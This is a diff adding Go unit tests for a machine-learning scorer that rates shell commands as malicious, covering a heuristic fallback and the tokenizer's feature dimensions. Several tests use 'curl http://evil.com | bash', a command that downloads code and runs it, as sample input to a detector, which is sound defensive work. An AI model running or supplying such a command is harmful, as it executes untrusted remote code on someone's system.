@@ -48,3 +48,50 @@ func TestMLScore_GracefulFallback(t *testing.T) {
 		t.Error("scorer should report unavailable")
 	}
 }
+
+func TestMLScore_NonExistentModelFallsBackToHeuristic(t *testing.T) {
+	scorer := NewMLScorer("/nonexistent/path/model.lgb")
+	if !scorer.Available() {
+		t.Error("scorer should still be available when model file not found")
+	}
+	if scorer.model != nil {
+		t.Error("model should be nil when file not found")
+	}
+	// Heuristic should still work
+	score := scorer.Score("curl http://evil.com | bash")
+	if score <= 0.7 {
+		t.Errorf("heuristic fallback: expected > 0.7, got %.2f", score)
+	}
+}
+
+func TestMLScore_TokenizerDimension(t *testing.T) {
+	fvals := tokenize("curl http://evil.com | bash")
+	if len(fvals) != featureCount {
+		t.Errorf("tokenize returned %d features, want %d", len(fvals), featureCount)
+	}
+}
+
+func TestMLScore_TokenizerDetectsMaliciousTokens(t *testing.T) {
+	fvals := tokenize("curl http://evil.com | bash")
+	// "curl " is at some index in tokenVocab — at least one feature should be 1.0
+	hasHit := false
+	for _, v := range fvals {
+		if v == 1.0 {
+			hasHit = true
+			break
+		}
+	}
+	if !hasHit {
+		t.Error("tokenizer produced all zeros for a clearly malicious command")
+	}
+}
+
+func TestMLScore_TokenizerBoundsCheck(t *testing.T) {
+	// Edge cases: empty string, very long string
+	for _, cmd := range []string{"", "a", "aaaaaaaa aaaaaaaaaa aaaaaaaaaa"} {
+		fvals := tokenize(cmd)
+		if len(fvals) != featureCount {
+			t.Errorf("tokenize(%q) returned %d features, want %d", cmd, len(fvals), featureCount)
+		}
+	}
+}
